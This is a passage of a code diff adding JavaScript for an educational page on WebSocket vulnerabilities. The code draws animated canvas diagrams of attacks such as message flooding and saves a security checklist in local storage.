+    ctx.fillText('App crashes or processes unauthorized data', w * 0.5, h * 0.1);
+    ctx.globalAlpha = 1;
+  }
+}
+
+// Flooding diagram
+function drawFlooding(setup, t) {
+  const { ctx, w, h } = setup;
+  const c = getColors();
+  ctx.clearRect(0, 0, w, h);
+
+  const ax = w * 0.12, ay = h * 0.5;
+  const sx = w * 0.88, sy = h * 0.5;
+
+  drawNode(ctx, ax, ay, 'Malicious', c.attacker);
+  drawNode(ctx, sx, sy, 'Server', c.server);
+
+  const count = Math.floor(t * 30);
+  for (let i = 0; i < Math.min(count, 20); i++) {
+    const offset = (i * 7 + (t * 200)) % 100;
+    const p = offset / 100;
+    const yoff = Math.sin(i * 1.3) * 18;
+    drawPacket(ctx, ax + 30, ay + yoff, sx - 30, sy + yoff, p, c.danger);
+  }
+
+  if (t > 0) {
+    drawArrow(ctx, ax + 30, ay, sx - 30, sy, c.danger, 1, false, '');
+    ctx.font = '600 11px IBM Plex Mono, monospace';
+    ctx.textAlign = 'center';
+    ctx.fillStyle = c.danger;
+    ctx.fillText(Math.floor(t * 5000) + ' msgs/sec', w * 0.5, h * 0.12);
+  }
+  if (t > 0.5) {
+    ctx.font = '600 12px IBM Plex Sans, system-ui';
+    ctx.fillStyle = c.warning;
+    ctx.globalAlpha = Math.min((t - 0.5) * 3, 1);
+    ctx.fillText('Server overwhelmed, users disconnected', w * 0.5, h * 0.9);
+    ctx.globalAlpha = 1;
+  }
+}
+
+const drawFns = { cswsh: drawCSWSH, xss: drawXSS, transport: drawTransport, validation: drawValidation, flooding: drawFlooding };
+
+function initDiagram(key) {
+  const setup = setupCanvas('diagram-' + key);
+  if (!setup) return;
+  diagrams[key] = setup;
+  if (animations[key]) cancelAnimationFrame(animations[key]);
+  runAnimation(key, 0);
+}
+
+function runAnimation(key, startTime) {
+  const duration = key === 'flooding' ? 4000 : 3000;
+  const setup = diagrams[key];
+  if (!setup) return;
+
+  function frame(ts) {
+    if (!startTime) startTime = ts;
+    const t = Math.min((ts - startTime) / duration, 1);
+    drawFns[key](setup, t);
+    if (t < 1) animations[key] = requestAnimationFrame(frame);
+  }
+  animations[key] = requestAnimationFrame(frame);
+}
+
+document.querySelectorAll('.play-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const key = btn.dataset.diagram;
+    if (animations[key]) cancelAnimationFrame(animations[key]);
+    runAnimation(key, 0);
+  });
+});
+
+// Init first diagram
+initDiagram('cswsh');
+
+// Handle resize
+window.addEventListener('resize', () => {
+  const active = document.querySelector('.tab.active');
+  if (active) initDiagram(active.dataset.panel);
+});
+
+// Persist checklist
+try {
+  const saved = JSON.parse(localStorage.getItem('ws-vuln-checklist') || '{}');
+  document.querySelectorAll('.checklist input').forEach((cb, i) => {
+    if (saved[i]) cb.checked = true;
+    cb.addEventListener('change', () => {
+      const state = {};
+      document.querySelectorAll('.checklist input').forEach((c, j) => { if (c.checked) state[j] = true; });
+      try { localStorage.setItem('ws-vuln-checklist', JSON.stringify(state)); } catch {}
+    });
+  });
+} catch {}
+</script>
